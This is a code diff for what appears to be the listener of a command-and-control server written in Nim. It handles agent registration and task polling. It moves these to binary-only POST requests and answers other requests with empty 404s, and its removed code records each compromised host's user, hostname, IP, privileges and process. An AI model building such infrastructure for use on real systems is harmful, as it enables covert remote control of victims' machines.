@@ -22,66 +22,26 @@ proc register*(ctx: Context) {.async.} =
 
     try: 
         let agentId = register(ctx.request.body.toBytes())
-        resp "Ok", Http200
+        resp "", Http200
 
     except CatchableError:
         resp "", Http404
 
-    # try: 
-    #     let 
-    #         postData: JsonNode = parseJson(ctx.request.body)
-    #         agentRegistrationData: AgentRegistrationData = postData.to(AgentRegistrationData)
-    #         agentUuid: string = generateUUID()
-    #         listenerUuid: string = ctx.getPathParams("listener")
-    #         date: DateTime = now()
-
-    #     let agent: Agent = Agent(
-    #         name: agentUuid, 
-    #         listener: listenerUuid,
-    #         username: agentRegistrationData.username,
-    #         hostname: agentRegistrationData.hostname,
-    #         domain: agentRegistrationData.domain,
-    #         process: agentRegistrationData.process,
-    #         pid: agentRegistrationData.pid,
-    #         ip: agentRegistrationData.ip,
-    #         os: agentRegistrationData.os,
-    #         elevated: agentRegistrationData.elevated, 
-    #         sleep: agentRegistrationData.sleep,
-    #         jitter: 0.2,
-    #         tasks: @[],
-    #         firstCheckin: date,
-    #         latestCheckin: date
-    #     )
-
-    #     # Fully register agent and add it to database
-    #     if not agent.register(): 
-    #         # Either the listener the agent tries to connect to does not exist in the database, or the insertion of the agent failed
-    #         # Return a 404 error code either way
-    #         resp "", Http404
-    #         return 
-
-    #     # If registration is successful, the agent receives it's UUID, which is then used to poll for tasks and post results
-    #     resp agent.name
-
-    # except CatchableError:
-    #     # JSON data is invalid or does not match the expected format (described above)
-    #     resp "", Http404
-
-    # return
-
 #[
-    GET /{listener-uuid}/{agent-uuid}/tasks
+    POST /tasks
     Called from agent to check for new tasks
 ]#
 proc getTasks*(ctx: Context) {.async.} = 
-    
-    let 
-        listener = ctx.getPathParams("listener")
-        agent = ctx.getPathParams("agent")
-        
+
+    # Check headers
+    # If POST data is not binary data, return 404 error code
+    if ctx.request.contentType != "application/octet-stream": 
+        resp "", Http404
+        return  
+
     try: 
         var response: seq[byte]
-        let tasks: seq[seq[byte]] = getTasks(listener, agent)
+        let tasks: seq[seq[byte]] = getTasks(ctx.request.body.toBytes())
 
         if tasks.len <= 0: 
             resp "", Http200
@@ -89,7 +49,7 @@ proc getTasks*(ctx: Context) {.async.} =
 
         # Create response, containing number of tasks, as well as length and content of each task
         # This makes it easier for the agent to parse the tasks
-        response.add(uint8(tasks.len))
+        response.add(cast[uint8](tasks.len))
 
         for task in tasks:
             response.add(uint32(task.len).toBytes()) 
